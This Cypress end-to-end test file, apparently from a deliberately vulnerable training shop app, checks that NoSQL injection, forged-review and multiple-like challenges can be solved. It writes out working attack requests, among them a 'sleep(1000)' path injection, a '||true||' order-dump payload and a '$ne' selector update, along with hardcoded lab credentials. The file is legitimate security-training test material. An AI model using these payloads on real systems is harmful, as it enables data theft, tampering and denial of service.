describe("/rest/products/reviews", () => {
  beforeEach(() => {
    cy.visit("/#/search");
  });

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: "admin", password: "admin123" });
    });
    it("should be possible to inject a command into the get route", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.window().then(() => {
            const xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
              if (this.status === 200) {
                console.log("Success");
              }
            };
            xhttp.open(
              "GET",
              `${Cypress.env("baseUrl")}/rest/products/sleep(1000)/reviews`,
              true
            );
            xhttp.setRequestHeader("Content-type", "text/plain");
            xhttp.send();
          });
          cy.expectChallengeSolved({ challenge: "NoSQL DoS" });
        }
      });
    });
  });

  describe('challenge "NoSQL Exfiltration"', () => {
    it("should be possible to inject and get all the orders", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.window().then(() => {
            const xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
              if (this.status === 200) {
                console.log("Success");
              }
            };
            xhttp.open(
              "GET",
              `${Cypress.env(
                "baseUrl"
              )}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
              true
            );
            xhttp.setRequestHeader("Content-type", "text/plain");
            xhttp.send();
          });
          cy.expectChallengeSolved({ challenge: "NoSQL Exfiltration" });
        }
      });
    });
  });

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: "admin", password: "admin123" });
    });

    it("should be possible to inject a selector into the update route", () => {
      cy.window().then(() => {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
          if (this.status == 200) {
            console.log("Success");
          }
        };

        xhttp.open(
          "PATCH",
          `${Cypress.env("baseUrl")}/rest/products/reviews`,
          true
        );
        xhttp.setRequestHeader("Content-type", "application/json");
        xhttp.setRequestHeader(
          "Authorization",
          `Bearer ${localStorage.getItem("token")}`
        );
        xhttp.send(
          JSON.stringify({ id: { $ne: -1 }, message: "NoSQL Injection!" })
        );
      });
      cy.expectChallengeSolved({ challenge: "NoSQL Manipulation" });
    });
  });

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: "mc.safesearch", password: "Mr. N00dles" });
    });

    it("should be possible to edit any existing review", () => {
      cy.visit("/");
      cy.window().then(() => {
        const xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
          if (this.readyState == 4 && this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id;
            editReview(reviewId);
          }
        };

        xhttp.open(
          "GET",
          `${Cypress.env("baseUrl")}/rest/products/1/reviews`,
          true
        );
        xhttp.setRequestHeader("Content-type", "text/plain");
        xhttp.send();

        function editReview(reviewId: string) {
          const xhttp = new XMLHttpRequest();
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log("Success");
            }
          };
          xhttp.open(
            "PATCH",
            `${Cypress.env("baseUrl")}/rest/products/reviews`,
            true
          );
          xhttp.setRequestHeader("Content-type", "application/json");
          xhttp.setRequestHeader(
            "Authorization",
            `Bearer ${localStorage.getItem("token")}`
          );
          xhttp.send(JSON.stringify({ id: reviewId, message: "injected" }));
        }
      });
      cy.expectChallengeSolved({ challenge: "Forged Review" });
    });
  });

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: "mc.safesearch", password: "Mr. N00dles" });
    });

    it("should be possible to like reviews multiple times", () => {
      cy.visit("/");
      cy.window().then(() => {
        const xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
          if (this.readyState == 4 && this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id;
            sendPostRequest(reviewId);
            sendPostRequest(reviewId);
            sendPostRequest(reviewId);
          }
        };

        xhttp.open(
          "GET",
          `${Cypress.env("baseUrl")}/rest/products/1/reviews`,
          true
        );
        xhttp.setRequestHeader("Content-type", "text/plain");
        xhttp.send();

        function sendPostRequest(reviewId: string) {
          const xhttp = new XMLHttpRequest();
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log("Success");
            }
          };
          xhttp.open(
            "POST",
            `${Cypress.env("baseUrl")}/rest/products/reviews`,
            true
          );
          xhttp.setRequestHeader("Content-type", "application/json");
          xhttp.setRequestHeader(
            "Authorization",
            `Bearer ${localStorage.getItem("token")}`
          );
          xhttp.send(JSON.stringify({ id: reviewId }));
        }
      });
      cy.expectChallengeSolved({ challenge: "Multiple Likes" });
    });
  });
});
